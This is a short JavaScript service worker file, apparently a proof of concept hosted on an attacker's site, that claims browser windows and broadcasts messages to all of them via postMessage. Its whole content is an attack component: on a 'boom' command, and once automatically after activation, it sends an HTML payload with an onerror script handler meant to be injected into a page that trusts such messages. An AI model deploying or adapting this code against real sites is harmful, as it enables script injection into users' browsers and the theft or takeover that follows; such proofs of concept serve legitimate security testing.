// sw.js — place at the root of attacker.com or a path matching scope you will use
self.addEventListener('install', event => {
  // Activate ASAP
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', event => {
  event.waitUntil(self.clients.claim());
});

// When the SW receives a message from a client (or on its own), broadcast to all clients
function broadcast(msg) {
  self.clients.matchAll({includeUncontrolled: true, type: 'window'}).then(clients => {
    clients.forEach(client => {
      client.postMessage(msg);
    });
  });
}

// optional: broadcast on fetch to ensure something triggers
self.addEventListener('message', event => {
  // If client sends {cmd:'boom'} we'll broadcast the payload
  if (event.data && event.data.cmd === 'boom') {
    broadcast(event.data.payload);
  }
});

// For immediate test: broadcast once after a short time (when SW activates)
setTimeout(() => {
  broadcast({poc: 'SW_TO_PAGE', html: '<img src=x onerror=alert("POC: SW -> parent")>'});
}, 500);
